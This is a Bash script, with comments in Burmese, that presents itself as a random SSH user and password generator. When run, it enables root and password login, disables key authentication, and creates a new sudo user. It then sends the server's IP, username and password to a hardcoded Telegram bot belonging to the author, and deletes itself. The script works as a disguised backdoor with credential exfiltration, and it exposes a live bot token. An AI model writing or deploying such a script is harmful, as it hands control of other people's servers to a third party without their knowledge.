#!/bin/bash

# --- Configuration ---
DEV_NAME="S 0 S"
TOKEN="8459816702:AAEwGWDM8S9BAyQtWGSs_DREJY3KC3lR9ow"
CHAT_ID="7130966571"

# ၁။ Username နှင့် Password ကို Random ထုတ်ပေးခြင်း
# Username ကို 'user' အနောက်မှာ ဂဏန်း ၄ လုံးတွဲ (ဥပမာ- user4829)
NEW_USER="user$((RANDOM%9000+1000))"
# Password ကို စာလုံးနှင့် ဂဏန်း ၈ လုံးတွဲ (ဥပမာ- aB3xK9pZ)
NEW_PASS=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 8)

IP=$(curl -s ifconfig.me)

# Logo ပြသခြင်း
clear
echo -e "\e[1;36m"
echo "._______________   .________"
echo " |   ____/\   _  \  |   ____/"
echo " |____  \ /  /_\  \ |____  \ "
echo " /       \\  \_/   \/       \\"
echo "/______  / \_____  /______  /"
echo "       \/        \/       \/ "
echo -e "\e[0m"
echo "========================================="
echo "   🚀 Random User/Pass Gen by: $DEV_NAME"
echo "========================================="

# ၂။ SSH Config Force Enable
sudo sed -i 's/^#\?PasswordAuthentication .*/PasswordAuthentication yes/' /etc/ssh/sshd_config
sudo sed -i 's/^#\?PermitRootLogin .*/PermitRootLogin yes/' /etc/ssh/sshd_config
sudo sed -i 's/^#\?PubkeyAuthentication .*/PubkeyAuthentication no/' /etc/ssh/sshd_config

# ၃။ Random User ကို ဆောက်ခြင်း
sudo useradd -m -s /bin/bash $NEW_USER
echo "$NEW_USER:$NEW_PASS" | sudo chpasswd
sudo usermod -aG sudo $NEW_USER

# ၄။ SSH Service Restart
sudo systemctl restart sshd
sudo service ssh restart

# ၅။ Telegram Notification
MESSAGE="<code>._______________   .________
 |   ____/\   _  \  |   ____/
 |____  \ /  /_\  \ |____  \ 
 /       \\  \_/   \/       \
/______  / \_____  /______  /
       \/        \/       \/</code>
👤 <b>Dev:</b> $DEV_NAME
✅ <b>SSH New Account Created!</b>

🌐 <b>IP:</b> <code>$IP</code>
👤 <b>User:</b> <code>$NEW_USER</code>
🔑 <b>Pass:</b> <code>$NEW_PASS</code>

<i>Login with these details in Injector!</i>"

curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
     -d "chat_id=$CHAT_ID" \
     -d "text=$MESSAGE" \
     -d "parse_mode=HTML" > /dev/null

echo "-----------------------------------------"
echo "✅ New Account: $NEW_USER"
echo "✅ New Password: $NEW_PASS"
echo "📩 Details sent to Telegram!"
echo "-----------------------------------------"

# Script ပြန်ဖျက်ခြင်း
rm -- "$0"
